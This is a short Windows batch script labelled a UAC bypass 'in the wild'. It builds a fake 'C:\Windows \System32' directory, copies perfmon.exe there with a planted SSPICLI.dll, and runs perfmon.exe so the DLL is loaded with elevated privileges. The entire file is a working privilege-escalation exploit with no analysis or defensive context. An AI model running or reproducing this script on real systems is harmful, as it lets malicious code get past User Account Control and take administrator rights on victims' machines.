@echo off
echo.
echo #### UAC Bypass In The Wild By @404death ####
mkdir "\\?\C:\Windows " 
mkdir "\\?\C:\Windows \System32"
echo  [+] file copying ...
copy "C:\Windows\System32\perfmon.exe" "C:\Windows \System32\"
echo  [+] file copying ...
copy "SSPICLI.dll" "C:\Windows \System32\"
"C:\Windows \System32\perfmon.exe"
echo  [-] UAC Bypassed ?
